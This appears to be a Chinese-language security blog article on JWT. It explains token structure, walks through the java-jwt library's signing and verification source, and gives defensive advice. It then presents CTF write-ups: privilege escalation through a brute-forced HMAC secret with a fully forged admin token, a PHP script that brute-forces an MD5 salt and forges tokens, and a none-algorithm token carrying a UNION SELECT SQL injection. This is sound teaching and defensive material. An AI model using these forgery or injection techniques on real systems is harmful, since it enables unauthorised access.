---
title: JWT漏洞原理与实战利用
description: 系统梳理 JWT 结构、常见漏洞（算法混淆、密钥爆破、None Algorithm、信息泄露）及利用工具，结合 DDCTF 与 0w1Club
  CTF 实战复现垂直越权、盐值离线爆破、SQL 注入绕过全过程。深度解析 JWT 在 CSRF 防御中的 Token 生成与验证实现细节，结合 Java JWT
  库源码分析完善防御视角内容。
category: program-analysis
tags:
- JWT
- 漏洞利用
- DDCTF
- 0w1Club
- CTF
- 垂直越权
- 算法混淆
- 密钥爆破
- MD5盐值爆破
- None Algorithm
- SQL注入
- 信息泄露
- CSRF防御
- Java JWT
- 源码分析
date: '2023-04-16'
updated: '2026-11-14'
---

## JWT 结构详解

典型的 JWT 由三个部分组成，每部分之间用 `.` 分隔：**Header**、**Payload**、**Signature**。

### Header

头部包含签名算法与令牌类型，通常为 JSON 格式，经 Base64URL 编码后传输。

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

- `alg`：签名算法（如 HS256、RS256、none 等）
- `typ`：令牌类型，固定为 `JWT`

### Payload

载荷包含业务数据与标准声明，同样经 Base64URL 编码。标准字段包括：

| 字段 | 含义 |
|------|------|
| `iss` | 签发人 |
| `exp` | 过期时间 |
| `iat` | 签发时间 |
| `nbf` | 生效时间 |
| `jti` | 编号 |
| `sub` | 主题 |
| `aud` | 受众 |

除标准字段外，可自定义私有字段（如 `userRole`、`name` 等）。

### Signature

签名用于防篡改，生成方式：

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

密钥仅服务器持有，泄露将导致伪造风险。

### Base64URL 编码说明

标准 Base64 可能出现 `+`、`/`、`=`，不适合 URL 传参。Base64URL 将 `+`→`-`、`/`→`_`、去掉末尾 `=`。

## JWT 在 CSRF 防御中的 Token 生成与验证实现

### CSRF 防御流程概述

CSRF（跨站请求伪造）漏洞的防御策略之一是在页面中引入 Token，其核心流程为：

1. **将 CSRF Token 输出到页面中**
   - 用户打开页面时，服务器生成一个 Token，该 Token 通过加密算法对数据进行加密，一般包含随机字符串和时间戳的组合
   - 将 Token 放在 Session 中

2. **页面提交的请求携带这个 Token**

3. **服务器验证 Token 是否正确**

以 JSON Web Token (JWT) 为例进行深度分析。

### Java JWT 库源码分析（com.auth0:java-jwt:3.11.0）

#### 依赖配置

```xml
<dependency>
    <groupId>com.auth0</groupId>
    <artifactId>java-jwt</artifactId>
    <version>3.11.0</version>
</dependency>
```

#### 密钥与过期时间设置

```java
// 密钥
public static final String SECRET = "sdjhakdhajdklsl;o653632";
// 过期时间: 秒
public static final int EXPIRE = 5;
```

#### Token 生成流程源码解析

```java
public static String createToken(String userId, String userName) throws Exception {
    Calendar nowTime = Calendar.getInstance();
    nowTime.add(Calendar.SECOND, EXPIRE);          // 过期时间
    Date expireDate = nowTime.getTime();
    
    Map<String, Object> map = new HashMap<>();     // header头 设置token类型以及加密算法
    map.put("alg", "HS256");
    map.put("typ", "JWT");
    
    String token = JWT.create()
        .withHeader(map)                           // 头
        .withClaim("userId", userId)
        .withClaim("userName", userName)
        .withSubject("测试")                        // 主题
        .withIssuedAt(new Date())                  // 签名时间
        .withExpiresAt(expireDate)                 // 过期时间
        .sign(Algorithm.HMAC256(SECRET));          // 签名
    return token;
}
```

**详细源码追踪**：

1. **`JWT.create()` 初始化 Builder**
   ```java
   public static JWTCreator.Builder create() {
       return JWTCreator.init();
   }
   
   static JWTCreator.Builder init() {
       return new Builder();
   }
   ```

2. **Builder 内部维护 Header 与 Payload 两个 Map**
   ```java
   private final Map<String, Object> payloadClaims;
   private final Map<String, Object> headerClaims;
   
   Builder() {
       this.payloadClaims = new HashMap<>();
       this.headerClaims = new HashMap<>();
   }
   ```

3. **`withHeader()` 填充 Header Claims**
   ```java
   public Builder withHeader(Map<String, Object> headerClaims) {
       if (headerClaims == null) return this;
       for (Map.Entry<String, Object> entry : headerClaims.entrySet()) {
           if (entry.getValue() == null) {
               this.headerClaims.remove(entry.getKey());
           } else {
               this.headerClaims.put(entry.getKey(), entry.getValue());
           }
       }
       return this;
   }
   ```

4. **`withClaim()` 系列方法填充 Payload**
   ```java
   public Builder withClaim(String name, String value) throws IllegalArgumentException {
       assertNonNull(name);
       addClaim(name, value);
       return this;
   }
   
   private void addClaim(String name, Object value) {
       if (value == null) {
           payloadClaims.remove(name);
           return;
       }
       payloadClaims.put(name, value);
   }
   ```
   `withSubject()`、`withIssuedAt()`、`withExpiresAt()` 内部均调用 `addClaim()`。

5. **`sign()` 最终生成 Token**
   ```java
   public String sign(Algorithm algorithm) throws IllegalArgumentException, JWTCreationException {
       if (algorithm == null) throw new IllegalArgumentException("The Algorithm cannot be null.");
       
       // 自动补全 alg 与 typ
       headerClaims.put(PublicClaims.ALGORITHM, algorithm.getName());
       if (!headerClaims.containsKey(PublicClaims.TYPE)) {
           headerClaims.put(PublicClaims.TYPE, "JWT");
       }
       
       String signingKeyId = algorithm.getSigningKeyId();
       if (signingKeyId != null) withKeyId(signingKeyId);
       
       return new JWTCreator(algorithm, headerClaims, payloadClaims).sign();
   }
   ```

   `PublicClaims` 接口定义了标准字段常量：
   ```java
   public interface PublicClaims {
       // Header
       String ALGORITHM = "alg";
       String CONTENT_TYPE = "cty";
       String TYPE = "typ";
       String KEY_ID = "kid";
       // Payload
       String ISSUER = "iss";
       String SUBJECT = "sub";
       String EXPIRES_AT = "exp";
       String NOT_BEFORE = "nbf";
       String ISSUED_AT = "iat";
       String JWT_ID = "jti";
       String AUDIENCE = "aud";
   }
   ```

6. **`JWTCreator` 内部将 Map 序列化为 JSON**
   ```java
   private JWTCreator(Algorithm algorithm, Map<String, Object> headerClaims, Map<String, Object> payloadClaims) throws JWTCreationException {
       this.algorithm = algorithm;
       try {
           ObjectMapper mapper = new ObjectMapper();
           SimpleModule module = new SimpleModule();
           module.addSerializer(ClaimsHolder.class, new PayloadSerializer());
           mapper.registerModule(module);
           mapper.configure(MapperFeature.SORT_PROPERTIES_ALPHABETICALLY, true);
           headerJson = mapper.writeValueAsString(headerClaims);
           payloadJson = mapper.writeValueAsString(new ClaimsHolder(payloadClaims));
       } catch (JsonProcessingException e) {
           throw new JWTCreationException("Some of the Claims couldn't be converted to a valid JSON format.", e);
       }
   }
   ```

7. **核心签名生成逻辑**
   ```java
   private String sign() throws SignatureGenerationException {
       String header = Base64.encodeBase64URLSafeString(headerJson.getBytes(StandardCharsets.UTF_8));
       String payload = Base64.encodeBase64URLSafeString(payloadJson.getBytes(StandardCharsets.UTF_8));
       byte[] signatureBytes = algorithm.sign(header.getBytes(StandardCharsets.UTF_8), payload.getBytes(StandardCharsets.UTF_8));
       String signature = Base64.encodeBase64URLSafeString(signatureBytes);
       return String.format("%s.%s.%s", header, payload, signature);
   }
   ```
   - Header 与 Payload 分别 Base64URL 编码
   - 使用 HS256 算法对 `header.payload` 进行 HMAC 签名
   - 签名结果再次 Base64URL 编码
   - 三部分用 `.` 连接形成最终 Token

#### Token 验证流程源码解析

**验证核心逻辑**：重新生成 Signature，与 Token 中携带的 Signature 对比是否一致。

```java
// 创建验证器，绑定算法与密钥
JWTVerifier verifier = JWT.require(Algorithm.HMAC256(SECRET)).build();

// 验证 Token
DecodedJWT jwt = verifier.verify(token);
```

1. **`JWT.require()` 创建 Verification Builder**
   ```java
   public static Verification require(Algorithm algorithm) {
       return JWTVerifier.init(algorithm);
   }
   ```

2. **`verifier.verify(token)` 解析并验证**
   ```java
   // 1. 解析 Token 三段
   DecodedJWT jwt = new JWTDecoder(parser, token);
   
   JWTDecoder(JWTParser converter, String jwt) throws JWTDecodeException {
       parts = TokenUtils.splitToken(jwt);  // 按 '.' 分割
       headerJson = StringUtils.newStringUtf8(Base64.decodeBase64(parts[0]));
       payloadJson = StringUtils.newStringUtf8(Base64.decodeBase64(parts[1]));
       header = converter.parseHeader(headerJson);
       payload = converter.parsePayload(payloadJson);
   }
   ```

3. **验证流程**
   ```java
   public DecodedJWT verify(DecodedJWT jwt) throws JWTVerificationException {
       verifyAlgorithm(jwt, algorithm);    // 验证加密算法是否一致
       algorithm.verify(jwt);              // 验证 Signature
       verifyClaims(jwt, claims);          // 验证过期时间等 Claims
       return jwt;
   }
   ```

4. **HMAC 签名验证核心实现**
   ```java
   public void verify(DecodedJWT jwt) throws SignatureVerificationException {
       byte[] signatureBytes = Base64.decodeBase64(jwt.getSignature());  // 解码 Token 中的签名
       try {
           // 使用本地密钥、Token 中的 Header 与 Payload 重新计算签名并对比
           boolean valid = crypto.verifySignatureFor(getDescription(), secret, jwt.getHeader(), jwt.getPayload(), signatureBytes);
           if (!valid) {
               throw new SignatureVerificationException(this);
           }
       } catch (IllegalStateException | InvalidKeyException | NoSuchAlgorithmException e) {
           throw new SignatureVerificationException(this, e);
       }
   }
   ```
   - 解码 Token 携带的 Signature
   - 使用相同算法、密钥、Header、Payload 重新计算签名
   - 恒时比较防止时序攻击
   - 验证通过后再检查 `exp`、`nbf` 等时间类 Claims

## JWT 使用方式

- 客户端登录成功后获取 JWT，存储于 Cookie / localStorage。
- 后续请求通过以下方式携带：
  - Cookie（同域自动发送）
  - `Authorization: Bearer <token>` 请求头
  - URL 参数或 POST Body

## JWT 安全注意事项

1. **默认不加密**：Payload 仅编码，不可存放敏感信息。
2. **密钥保密**：签名密钥一旦泄露，攻击者可伪造任意 Token。
3. **无状态不可撤销**：签发后无法主动失效，建议设置较短 `exp` 并配合黑名单机制。
4. **传输加密**：必须使用 HTTPS 防止中间人窃取。
5. **算法白名单**：服务端必须显式校验 `alg` 字段，仅允许预期算法（HS256/RS256），拒绝 `none` 算法。
6. **密钥强度**：HS256 密钥熵需足够高，避免字典爆破。

## DDCTF 实战复现：垂直越权漏洞利用

### 题目环境与初步分析

- 目标地址：`http://117.51.136.197/`
- 两个关键接口：
  1. `POST /admin/login`：传 `username`、`pwd`，返回 JWT。
  2. `POST /admin/auth`：传 `username`、`pwd`、`token`，校验权限。

首次登录 `admin` 账号，返回 Token 解码后 `userRole=GUEST`，提示需要 `ADMIN` 权限。

### 步骤一：获取并解码 JWT

登录响应 `data` 字段为典型三段式 JWT：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyUm9sZSI6IkdVRVNUIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ.xxx
```

解码 Header 与 Payload：

```json
// Header
{"typ":"JWT","alg":"HS256"}

// Payload
{"userRole":"GUEST","name":"admin","iat":1556499536}
```

发现 `userRole` 可控，若能修改为 `ADMIN` 并绕过签名校验，即可实现垂直越权。

### 步骤二：尝试算法混淆攻击

**原理**：若服务端支持 `alg: "none"`，则忽略签名验证，仅需 Header+Payload。

构造脚本（参考 [JwtExploit](https://github.com/ShadowFlow123/JwtExploit/blob/master/jwtNone.py)）生成 Token：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ.
```

请求 `/admin/auth` 返回 **Token 不合法**，说明服务端禁用了 `none` 算法。

### 步骤三：密钥爆破

HS256 为对称加密，密钥强度取决于复杂度。使用字典爆破脚本（参考 [jwtBrute.py](https://github.com/ShadowFlow123/JwtExploit/blob/master/jwtBrute.py)）跑出密钥：**`admin`**（规律：密钥即用户名）。

### 步骤四：构造恶意 JWT 实现越权

利用爆破出的密钥 `admin`，按以下步骤构造合法 Token：

1. **Header Base64URL**  
   `{"typ":"JWT","alg":"HS256"}` → `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`

2. **Payload Base64URL**  
   `{"userRole":"ADMIN","name":"admin","iat":1556499536}` → `eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ`

3. **签名计算**  
   对 `header.payload` 使用 HMAC-SHA256，密钥 `admin`：  
   `HMACSHA256("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ", "admin")`  
   → `J5Lqm1twIWhIPU4V8G5jHzKhPFlkYju2U6aSVo9e3Lc`

4. **拼接完整 Token**  
   `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ.J5Lqm1twIWhIPU4V8G5jHzKhPFlkYju2U6aSVo9e3Lc`

携带该 Token 请求 `/admin/auth`，成功获取 Flag 页面：`http://117.51.136.197/B5Itb8dFDaSFWZZo/client`。

> 也可使用 [jwt.io Debugger](https://jwt.io/) 可视化完成上述构造。

## 0w1Club CTF 实战案例补充

### 案例一：JWT MD5 盐值离线爆破伪造 admin token

**来源**：[[0w1club-ctf-web-writeup-jwt-sqli-brute]] 第 03 题

#### 题目场景
- 登录测试账号后，Cookie 中包含 JWT 认证令牌
- Base64 解码发现采用 **MD5 加盐方式** 签名（非标准 HS256）
- 后端验证逻辑：`signature = MD5(header + "." + payload + salt)`

#### 攻击思路
1. **获取合法 JWT**：使用测试账号登录，捕获 Cookie 中的 token
2. **离线爆破盐值**：编写脚本（推荐 PHP 保持与后端一致），对盐值进行字典爆破
   - 爆破目标：`MD5(base64(header) + "." + base64(payload) + salt) === signature`
   - 盐值通常较短、规律性强（如用户名、固定字符串等）
3. **伪造管理员 Token**：
   - 修改 Payload 中 `userRole` 为 `admin` / `ADMIN`
   - 使用爆破出的盐值重新计算签名
   - 替换 Cookie 中的 token 刷新页面，越权访问管理员功能获取 flag

#### 关键代码片段（PHP 示例）
```php
// 爆破盐值
$salt_dict = file('dict.txt', FILE_IGNORE_NEW_LINES);
foreach ($salt_dict as $salt) {
    $calc_sign = md5($header_b64 . '.' . $payload_b64 . $salt);
    if ($calc_sign === $signature) {
        echo "Found salt: $salt";
        break;
    }
}

// 伪造 admin token
$new_payload = '{"userRole":"admin","name":"admin","iat":'.time().'}';
$new_payload_b64 = base64_url_encode($new_payload);
$new_sign = md5($header_b64 . '.' . $new_payload_b64 . $found_salt);
$forged_token = $header_b64 . '.' . $new_payload_b64 . '.' . $new_sign;
```

#### 防御建议
- 使用标准算法（HS256/RS256）而非自制签名方案
- 盐值/密钥需足够长、高熵，避免规律性
- 服务端应严格校验算法字段，拒绝非预期算法

---

### 案例二：None Algorithm 漏洞绕过签名验证并注入 SQL 语句获取 flag

**来源**：[[0w1club-ctf-web-writeup-jwt-sqli-brute]] 第 05 题

#### 题目场景
- 页面存在数据库交互特征，疑似 SQL 注入点
- 认证采用 JWT，Cookie 中传递 token
- 后端解析 JWT 后，将 `username` / `name` 字段直接拼接进 SQL 查询

#### 攻击链分析
1. **识别注入点**：推测后端查询类似 `SELECT * FROM users WHERE username = '<jwt_payload_name>'`
2. **绕过签名验证**：利用 **None Algorithm 漏洞**（`alg: "none"`）
   - 服务端若未显式禁用 `none` 算法，会跳过签名校验
   - 构造 Header：`{"typ":"JWT","alg":"none"}` → Base64URL 编码
   - 构造 Payload：注入 SQL 语句于可控字段（如 `name` 或 `username`）
   - Signature 留空（仅保留两个点分隔符）
3. **构造恶意 Payload 示例**：
   ```json
   {
     "username": "admin' UNION SELECT flag FROM chest--",
     "userRole": "ADMIN"
   }
   ```
4. **发送请求**：携带伪造的 `header.payload.` 访问目标接口，触发 SQL 注入，从 `chest` 表中查出 flag

#### 完整 Token 构造流程
```
Header:    eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
Payload:   eyJ1c2VybmFtZSI6ImFkbWluJyBVUklPTiBTRUxFQ1QgZmxhZyBGUk9NIENIRVNULS0iLCJ1c2VyUm9sZSI6IkFETUlOIn0
Signature: (空)
Token:     eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluJyBVUklPTiBTRUxFQ1QgZmxhZyBGUk9NIENIRVNULS0iLCJ1c2VyUm9sZSI6IkFETUlOIn0.
```

#### 根因与修复
| 根因 | 修复措施 |
|------|----------|
| 服务端未校验 `alg` 字段，允许 `none` 算法 | 显式维护算法白名单（仅允许 HS256/RS256 等），拒绝 `none` |
| JWT 解析后的用户输入直接拼接 SQL | 使用参数化查询 / 预编译语句 |
| 业务逻辑过度信任客户端传递的身份标识 | 服务端维护会话映射，JWT 仅作标识不作授权依据 |

## 利用工具与脚本

- **JwtExploit** 系列脚本（GitHub）：  
  - `jwtNone.py`：算法混淆生成 `none` 算法 Token  
  - `jwtBrute.py`：HS256 密钥字典爆破
- **CyberChef** / **jwt.io** ：Base64URL 编解码、签名计算、Token 调试
- **Burp Suite** 插件：JWT Editor、JSON Web Tokens 支持自动化测试
- **自定义脚本**：针对非标准签名（如 MD5+salt）需自行编写爆破/伪造脚本，建议与后端语言保持一致（PHP/Python/Node.js/Go）

## 交叉引用与延伸阅读

- [[0w1club-ctf-web-writeup-jwt-sqli-brute]] — 0w1Club CTF Web 方向完整 Writeup，含 Base64+Brainfuck 签到、.htpasswd 信息泄露、验证码绕过暴力破解等题目
- [[0w1club-ctf-web-writeup-hash-extension-rsa]] — 同源 CTF Web 题解，涵盖哈希长度扩展攻击、PHP 弱类型比较、RSA 解密等技术
- [[java-preparedstatement-sql-injection-defense]] — Java PreparedStatement 预编译机制防御 SQL 注入，与 JWT 场景下的参数化查询防御同属一类
- [[spring-boot-devtools-deserialization-rce]] — Spring Boot DevTools 弱默认密钥导致反序列化 RCE，与 JWT 密钥管理不当同属“默认/弱密钥”风险类

## 参考资源

- 原文：[微信公众号文章](http://mp.weixin.qq.com/s?__biz=MzUzMzEwMDk3Mg==&mid=2247483879&idx=1&sn=62e66f486f9060739640bcd287237b31)
- 0w1Club 微信归档索引：[[0w1club-wechat-archive-201908-202207]]
- 作者 GitHub（DDCTF 复现脚本）：<https://github.com/ShadowFlow123/>
- 博客园对应文章：<https://www.cnblogs.com/jinbuqi/p/10361698.html>
- CSRF Token 防御原文：[无名安全团队文章](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247486542&idx=1&sn=3828e2d41f13049dd4f974394272d568)

## 来源

- [0x00实验室-202108-202304_073](../sources/0x00实验室-202108-202304_073.md)
